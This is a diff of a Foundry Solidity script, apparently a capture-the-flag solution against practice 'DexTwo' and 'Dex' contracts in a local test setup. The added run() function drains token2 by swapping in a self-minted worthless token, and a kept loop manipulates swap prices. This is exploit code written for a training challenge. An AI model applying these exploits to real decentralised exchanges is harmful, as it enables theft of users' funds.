@@ -2,20 +2,20 @@
 pragma solidity >=0.8.10;
 
 import "forge-std/Script.sol";
-import "../src/Dex.sol";
+import "../src/DexTwo.sol";
 
-contract DexHack is Script {
-    Dex public dex;
-    SwappableToken public token1;
-    SwappableToken public token2;
+contract DexTwoHack is Script {
+    DexTwo public dex;
+    SwappableTokenTwo public token1;
+    SwappableTokenTwo public token2;
     address public eoa = address(1024);
 
     function setUp() public {
-        dex = new Dex();
+        dex = new DexTwo();
 
         vm.startPrank(eoa);
-        token1 = new SwappableToken(address(dex), "Token1", "TK1", 110);
-        token2 = new SwappableToken(address(dex), "Token2", "TK2", 110);
+        token1 = new SwappableTokenTwo(address(dex), "Token1", "TK1", 110);
+        token2 = new SwappableTokenTwo(address(dex), "Token2", "TK2", 110);
 
         token1.transfer(address(dex), 100);
         token2.transfer(address(dex), 100);
@@ -34,6 +34,25 @@ contract DexHack is Script {
     }
 
     function run() public {
+        vm.startPrank(eoa);
+        SwappableTokenTwo token3 = new SwappableTokenTwo(
+            address(dex),
+            "MyToken",
+            "MTK",
+            1_000_000
+        );
+        token3.transfer(address(this), 100);
+        token3.transfer(address(dex), 100);
+        vm.stopPrank();
+
+        token3.approve(address(this), address(dex), 1_000_000);
+        dex.swap(address(token3), address(token2), 100);
+
+        console.log(token2.balanceOf(address(dex)));
+    }
+
+    // dummy one
+    function attack() public {
         // start attacking
         address[2] memory tokens = [dex.token1(), dex.token2()];
         uint256[2] memory hackBalances;
@@ -43,15 +62,15 @@ contract DexHack is Script {
         uint256 to = 1;
         while (true) {
             hackBalances = [
-                SwappableToken(tokens[from]).balanceOf(address(this)),
-                SwappableToken(tokens[to]).balanceOf(address(this))
+                SwappableTokenTwo(tokens[from]).balanceOf(address(this)),
+                SwappableTokenTwo(tokens[to]).balanceOf(address(this))
             ];
 
             dexBalances = [
-                SwappableToken(tokens[from]).balanceOf(address(dex)),
-                SwappableToken(tokens[to]).balanceOf(address(dex))
+                SwappableTokenTwo(tokens[from]).balanceOf(address(dex)),
+                SwappableTokenTwo(tokens[to]).balanceOf(address(dex))
             ];
-            uint256 swapPrice = dex.getSwapPrice(
+            uint256 swapPrice = dex.getSwapAmount(
                 tokens[from],
                 tokens[to],
                 hackBalances[0]
